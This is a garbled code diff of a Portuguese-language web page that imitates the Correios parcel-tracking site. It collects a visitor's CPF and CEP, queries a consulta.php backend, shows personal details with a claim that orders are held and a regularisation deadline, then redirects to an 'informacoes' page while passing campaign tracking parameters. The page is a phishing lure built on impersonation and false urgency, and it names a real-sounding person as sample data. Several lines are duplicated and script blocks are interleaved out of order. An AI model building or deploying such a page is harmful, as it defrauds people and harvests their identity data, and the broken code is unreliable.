@@ -1,123 +1,338 @@
+
+@ -1,14 +1,17 @@
+<html lang="pt-BR"><head></head>
+<body>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="stylesheet" href="css/bootstrap.css">
+  <link rel="stylesheet" href="css/app.css">
+  <link rel="stylesheet" href="css/yellow.css">
+  <link rel="icon" type="image/x-icon" href="../wp-content/uploads/2024/11/regular_correios-logo-2.png">
+  <script src="../scripts/utms/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
 <!DOCTYPE html>
 <html lang="pt-BR">
 
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Rastreamento de Encomenda - Correios</title>
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <link rel="stylesheet" href="css/bootstrap.css" />
+  <link rel="stylesheet" href="css/app.css" />
+  <link rel="stylesheet" href="css/yellow.css" />
+  <link rel="icon" type="image/x-icon" href="../wp-content/uploads/2024/11/regular_correios-logo-2.png" />
+  <script src="../scripts/utms/latest.js" data-utmify-prevent-subids="" async defer></script>
+  <title>Correios | Rastreio</title>
+
   <style>
-    body {
-      background-color: #f1f1f1;
+    /* Animação para o botão pulsando */
+    @keyframes pulsar {
+@ -25,85 +28,11 @@
+      }
+    }
+
+    #confirmar-btn {
+    #consultar-btn {
+      animation: pulsar 1s infinite;
+    }
+
+    /* Estilos para o pop-up */
+    #popup-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      animation: fadeInOverlay 0.5s ease-out;
+    }
+
+    #popup-content {
+      background: #fff;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      width: 90%;
+      max-width: 500px;
+      animation: slideIn 0.5s ease-out;
+      font-family: 'Arial', sans-serif;
+    }
+
+    #popup-content h2 {
+      font-size: 1.8rem;
+      font-weight: bold;
+      margin-bottom: 20px;
+      color: #003157;
+    }
+
+    #popup-content p {
+      font-size: 1.1rem;
+      margin-bottom: 15px;
+    }
+
+    #popup-content p span {
+      font-weight: bold;
+      color: #007bff;
+    }
+
+    #popup-content .btn {
+      margin-top: 20px;
+      font-size: 1rem;
+      padding: 10px 20px;
+      border-radius: 8px;
+    }
+
+    /* Animações */
+    @keyframes fadeInOverlay {
+      from {
+        opacity: 0;
+      }
+
+      to {
+        opacity: 1;
+      }
+    }
+
+    @keyframes slideIn {
+      from {
+        transform: translateY(-50px);
+        opacity: 0;
+      }
+
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    /* Animação de carregamento */
+    /* Spinner */
+    .spinner {
+      width: 50px;
+      height: 50px;
+@ -119,16 +48,49 @@
+        transform: rotate(360deg);
+      }
+    }
+  </style>
+
+    /* Container centralizado */
+    main {
+      max-width: 1000px;
+      margin: 2rem auto;
+      padding: 0 1rem;
+    }
+
+    /* Tela de resultado */
+    #resultado {
+      background: #f8f9fa;
+      border-radius: 10px;
+      padding: 2rem;
       font-family: Arial, sans-serif;
       color: #003157;
       box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
-      text-align: left;
     }
 
     #resultado h2 {
-      font-size: 1.8rem;
-      font-weight: bold;
+      font-weight: 700;
+      margin-bottom: 1rem;
       color: #003157;
     }
 
     #resultado p {
+      font-size: 1.1rem;
       margin: 0.5rem 0;
     }
 
-    /* Bairro e Rua em branco com fundo azul escuro */
-    #res-rua,
-    #res-bairro {
-      color: white !important;
-      background-color: #003157;
-      padding: 2px 6px;
-      border-radius: 4px;
-      display: inline-block;
-    }
-
-    /* Prazo centralizado e vermelho */
-    #prazo-container {
-      margin-top: 1.5rem;
-      text-align: center;
+    #resultado p span {
       font-weight: 700;
-      font-size: 1.3rem;
-      color: red;
-    }
-
-    /* Botão azul "SIM, SOU EU" */
-    #btn-sim-sou-eu {
-      margin-top: 2rem;
-      display: block;
-      background-color: #007bff;
-      color: white;
-      border: none;
-      padding: 12px 25px;
-      font-size: 1.1rem;
-      font-weight: 700;
-      border-radius: 6px;
-      cursor: pointer;
-      text-align: center;
-      width: 100%;
-      max-width: 250px;
-      margin-left: auto;
-      margin-right: auto;
-      transition: background-color 0.3s ease;
-    }
-
-    #btn-sim-sou-eu:hover {
-      background-color: #0056b3;
+      color: #007bff;
     }
   </style>
 </head>
 
 <body>
-  <section id="tela-formulario" class="container py-4">
-    <h2>Rastreamento de Encomenda - Correios</h2>
-    <form id="form-rastreamento">
-      <div class="mb-3">
-        <label for="cpf">CPF:</label>
-        <input type="text" id="cpf" name="cpf" class="form-control" required />
-      </div>
-      <div class="mb-3">
-        <label for="cep">CEP:</label>
-        <input type="text" id="cep" name="cep" class="form-control" required />
-      </div>
-      <button type="submit" class="btn btn-primary">Consultar</button>
-    </form>
-  </section>
-
-  <section id="loading-container" class="container py-4" style="display: none;">
-    <p>Consultando dados... Por favor, aguarde.</p>
-  </section>
-
-  <section id="resultado" class="container py-4" style="display: none;">
-    <h2>Resultado da Consulta</h2>
-    <p><span>Nome:</span> <span id="res-nome"></span></p>
-    <p><span>CPF:</span> <span id="res-cpf"></span></p>
-    <p><span>CEP:</span> <span id="res-cep"></span></p>
-    <p><span>Rua:</span> <span id="res-rua"></span></p>
-    <p><span>Bairro:</span> <span id="res-bairro"></span></p>
-    <p><span>Cidade:</span> <span id="res-cidade"></span></p>
-    <p><span>Estado:</span> <span id="res-estado"></span></p>
-
-    <!-- Prazo com contagem regressiva -->
-    <div id="prazo-container">
-      Prazo para Regularização: <span id="res-prazo"></span><br />
-      <span id="countdown"></span>
+  <header class="w-100 font-size-16 font-weight-400 text-blue">
+    <div class="w-100 bg-grey px-3 px-lg-3 py-1 border-bottom border-white">
+      <span>Acessibilidade</span>
+      <i class="fas fa-caret-down ml-1"></i>
     </div>
+    <div class="">
+    <div>
+      <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning" style="height:48px">
+        <div class="menu-toggle" id="menu-toggle" style="width:50px">
+          <div class="bar"></div>
+@ -137,12 +99,12 @@
+        </div>
+        <div class="ml-0 ml-lg-1 d-flex justify-content-center" style="width:100%">
+          <a href="#" class="py-2">
+            <img src="images/correios.png" alt="" height="25">
+            <img src="images/correios.png" alt="" height="25" />
+          </a>
+        </div>
+        <div class="ml-4 d-none d-lg-block" style="width:150px">
+          <a href="#" class="py-1 text-blue-dark border-left border-secondary px-3 text-decoration-none">
+            <img src="images/entrar.svg" alt="Correios" width="31">
+            <img src="images/entrar.svg" alt="Correios" width="31" />
+            <span class="ml-1">Entrar</span>
+          </a>
+        </div>
+@ -155,53 +117,52 @@
+      Rastreamento
+    </h1>
 
-    <button id="btn-sim-sou-eu" type="button">SIM, SOU EU</button>
-  </section>
+    <section class="mt-3 p-4 bg-grey-3 w-95 max-w-1000" style="margin:0 auto;">
+    <!-- Tela Formulário -->
+    <section id="tela-formulario" class="mt-3 p-4 bg-grey-3 w-95 max-w-1000" style="margin:0 auto;">
+      <h5 style="color: #003157;" class="text-center font-weight-700 mb-4">
+        <i class="far fa-exclamation-triangle"></i> ACOMPANHE SUAS ENCOMENDAS ABAIXO
+      </h5>
 
+      <form id="form-rastreamento">
+        <span>Deseja acompanhar seu objeto?</span><br>
+        <span>Deseja acompanhar seu objeto?</span><br />
+        <span>Digite o CPF do comprador.</span>
+        <div class="form-group mt-1">
+          <input type="text" name="cpf" class="form-control" placeholder="000.000.000-00" maxlength="14" required="" id="cpf">
+          <input type="text" name="cpf" class="form-control" placeholder="000.000.000-00" maxlength="14" required id="cpf" />
+        </div>
+
+        <span>Informe o seu CEP abaixo.</span>
+        <div class="form-group mt-1">
+          <input type="text" name="cep" class="form-control" id="cep" placeholder="00000-000" maxlength="9" required="">
+          <input type="text" name="cep" class="form-control" id="cep" placeholder="00000-000" maxlength="9" required />
+        </div>
+
+
+        <div class="form-group mt-1 d-flex justify-content-center" id="botao-container">
+          <button type="submit" class="btn btn-primary" id="consultar-btn">Consultar</button>
+        </div>
+
+        <div id="loading-container" style="display: none; text-align: center; margin-top: 20px;">
+          <p style="font-size: 16px; color: #333;">Consultando seus dados...</p>
+          <div class="spinner" style="border: 4px solid rgba(0,0,0,0.1); border-left-color: #007bff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto;">
+          </div>
+          <div class="spinner"></div>
+        </div>
+
+        <style>
+          @keyframes spin {
+            to {
+              transform: rotate(360deg);
+            }
+          }
+        </style>
+
+
+      </form>
+    </section>
+
+      
+
+
+    <!-- Tela Resultado -->
+    <section id="resultado" style="display: none;">
+      <h2>Encontramos pedidos retidos em uma de nossas agências. 📦</h2>
+      <p><span>Nome:</span> <span id="res-nome"></span></p>
+      <p><span>CPF:</span> <span id="res-cpf"></span></p>
+      <p><span>Nascimento:</span> <span id="res-nascimento"></span></p>
+      <p><span>CEP:</span> <span id="res-cep"></span></p>
+      <p><span>Rua:</span> <span id="res-rua"></span></p>
+      <p><span>Bairro:</span> <span id="res-bairro"></span></p>
+      <p><span>Cidade:</span> <span id="res-cidade"></span></p>
+      <p><span>Estado:</span> <span id="res-estado"></span></p>
+      <p><span>Prazo para Regularização:</span> <span id="res-prazo"></span></p>
+    </section>
+
+    <section class="my-4 w-95 max-w-1000" style="margin:0 auto;">
+    <section class="my-4 w-95 max-w-1000" style="margin: 0 auto;">
+      <div>
+        <img src="images/banner-1.jpg" alt="" class="w-100">
+        <img src="images/banner-1.jpg" alt="" class="w-100" />
+      </div>
+    </section>
+  </main>
+@ -219,95 +180,96 @@
+      </ul>
+    </div>
+  </footer>
+<script>
+  document.getElementById('form-rastreamento').addEventListener('submit', async function (event) {
+    event.preventDefault();
+
+    const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
+    const cepInput = document.getElementById('cep');
+    const cep = cepInput.disabled ? '' : cepInput.value.replace(/\D/g, '');
+
+    const botao = document.getElementById('consultar-btn');
+    const botaoContainer = document.getElementById('botao-container');
+    const loadingContainer = document.getElementById('loading-container');
+
+    if (!cpf) {
+      alert('Por favor, insira o CPF.');
+      return;
   <script>
+    // Função para formatar CPF (###.###.###-##)
     function formatarCPF(cpf) {
       return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
     }
 
+    botao.style.display = "none";
+
+    setTimeout(() => {
+      botaoContainer.style.display = "none";
+      loadingContainer.style.display = "block";
+    }, 100);
+
+    try {
+      const response = await fetch(`consulta.php?cpf=${cpf}&cep=${cep}`);
+      const data = await response.json();
+
+      if (data.status === 200) {
+        const newParams = new URLSearchParams();
+        newParams.set("cpf", cpf);
+        if (cep) newParams.set("cep", cep);
+
+        // Preservar os parâmetros UTM da URL atual
+        const currentParams = new URLSearchParams(window.location.search);
+        const utmFields = ["src", "sck", "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term"];
+        
+        utmFields.forEach(field => {
+          if (currentParams.has(field)) {
+            newParams.set(field, currentParams.get(field));
+          }
+        });
+
+        // Redirecionar para "informacoes" com os parâmetros completos
+        window.location.href = `informacoes?${newParams.toString()}`;
+      } else {
+        alert('Erro na consulta: ' + (data.message || 'Tente novamente.'));
+        botao.style.display = "block"; 
+        botaoContainer.style.display = "flex";
+        loadingContainer.style.display = "none";
+      }
+    } catch (error) {
+      alert('Erro ao conectar ao servidor.');
+      botao.style.display = "block"; 
+      botaoContainer.style.display = "flex";
+      loadingContainer.style.display = "none";
+    // Função para formatar CEP (#####-###)
     function formatarCEP(cep) {
       return cep.replace(/(\d{5})(\d{3})/, "$1-$2");
     }
+  });
 
+  document.getElementById('nao-sei-cep').addEventListener('change', function () {
+    const cepInput = document.getElementById('cep');
+    cepInput.disabled = this.checked;
+    if (this.checked) {
+      cepInput.value = '';
+    // Função para adicionar dias e formatar data dd/mm/aaaa
     function formatarPrazo(dataBase, diasAdicionar, horas, minutos) {
       const prazo = new Date(dataBase);
       prazo.setDate(prazo.getDate() + diasAdicionar);
@@ -131,75 +346,93 @@
       const hh = prazo.getHours().toString().padStart(2, "0");
       const min = prazo.getMinutes().toString().padStart(2, "0");
 
-      return {
-        text: `${dd}/${mm}/${yyyy} às ${hh}:${min}`,
-        dateObj: prazo
-      };
+      return `${dd}/${mm}/${yyyy} às ${hh}:${min}`;
     }
+  });
 
-    function atualizarContagem(prazoDate) {
-      const now = new Date().getTime();
-      const distance = prazoDate - now;
+  // Função para adicionar parâmetros UTM aos links
+  function adicionarParametrosUTM() {
+    const location = new URL(window.location.href);
+    const fields = ["src", "sck", "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term"];
+    var links = document.querySelectorAll("a[href]");
 
-      if (distance < 0) {
-        document.getElementById("countdown").textContent = "Prazo expirado!";
-        return;
-      }
-
-      const dias = Math.floor(distance / (1000 * 60 * 60 * 24));
-      const horas = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-      const minutos = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-      const segundos = Math.floor((distance % (1000 * 60)) / 1000);
-
-      document.getElementById("countdown").textContent = `Tempo restante: ${dias}d ${horas}h ${minutos}m ${segundos}s`;
-    }
+    links.forEach(link => {
+      if (!link.href.includes("#")) {
+        let newURL = new URL(link.href);
+        fields.forEach(field => {
+          if (location.searchParams.has(field)) {
+            newURL.searchParams.set(field, location.searchParams.get(field));
+          }
+        });
+        link.href = newURL.toString();
 
     document.getElementById("form-rastreamento").addEventListener("submit", async function (event) {
       event.preventDefault();
 
-      const cpfRaw = document.getElementById("cpf").value.replace(/\D/g, "");
-      const cepRaw = document.getElementById("cep").value.replace(/\D/g, "");
+      const cpfInput = document.getElementById("cpf");
+      const cepInput = document.getElementById("cep");
 
+      const cpfRaw = cpfInput.value.replace(/\D/g, "");
+      const cepRaw = cepInput.value.replace(/\D/g, "");
+
+      if (!cpfRaw || cpfRaw.length !== 11) {
+        alert("Por favor, insira um CPF válido.");
+        return;
+      }
+    });
+  }
+
+  // Chamada imediata ao carregar a página
+  document.addEventListener("DOMContentLoaded", adicionarParametrosUTM);
+</script>
+      if (!cepRaw || cepRaw.length !== 8) {
+        alert("Por favor, insira um CEP válido.");
+        return;
+      }
+
+      // Esconde botão e mostra loading
+      document.getElementById("botao-container").style.display = "none";
       document.getElementById("loading-container").style.display = "block";
-      document.getElementById("resultado").style.display = "none";
 
-      // Simula delay de 2 segundos (substitua por sua consulta real ao backend)
+      // Simulação de consulta — aqui você deve chamar seu backend real
+      // Por exemplo, fetch('consulta.php?cpf=...&cep=...')
+      // e pegar os dados do JSON retornado.
+
+      // Simular delay de 2 segundos
       await new Promise((resolve) => setTimeout(resolve, 2000));
 
-      const prazoData = formatarPrazo(new Date(), 10, 23, 59);
-
+      // Simulação de dados recebidos
+      // Você pode substituir isso por dados reais da sua consulta
       const dadosPessoa = {
         nome: "Rosiane Oliveira Da Silva",
         cpf: formatarCPF(cpfRaw),
+        nascimento: "27/01/1985",
         cep: formatarCEP(cepRaw),
-        rua: "Rua das Flores",
+        rua: "Rua das Acácias",
         bairro: "Centro",
         cidade: "Porciúncula",
         estado: "RJ",
-        prazoRegularizacaoText: prazoData.text,
-        prazoRegularizacaoDate: prazoData.dateObj,
+        prazoRegularizacao: formatarPrazo(new Date(), 10, 23, 59), // prazo 10 dias a partir de hoje
       };
 
+      // Preencher resultado
       document.getElementById("res-nome").textContent = dadosPessoa.nome;
       document.getElementById("res-cpf").textContent = dadosPessoa.cpf;
+      document.getElementById("res-nascimento").textContent = dadosPessoa.nascimento;
       document.getElementById("res-cep").textContent = dadosPessoa.cep;
       document.getElementById("res-rua").textContent = dadosPessoa.rua;
       document.getElementById("res-bairro").textContent = dadosPessoa.bairro;
       document.getElementById("res-cidade").textContent = dadosPessoa.cidade;
       document.getElementById("res-estado").textContent = dadosPessoa.estado;
-      document.getElementById("res-prazo").textContent = dadosPessoa.prazoRegularizacaoText;
+      document.getElementById("res-prazo").textContent = dadosPessoa.prazoRegularizacao;
 
+      // Esconde formulário e loading, mostra resultado
       document.getElementById("loading-container").style.display = "none";
       document.getElementById("tela-formulario").style.display = "none";
       document.getElementById("resultado").style.display = "block";
-
-      atualizarContagem(dadosPessoa.prazoRegularizacaoDate.getTime());
-      setInterval(() => {
-        atualizarContagem(dadosPessoa.prazoRegularizacaoDate.getTime());
-      }, 1000);
     });
   </script>
 </body>
 
+</body></html>
 </html>
-
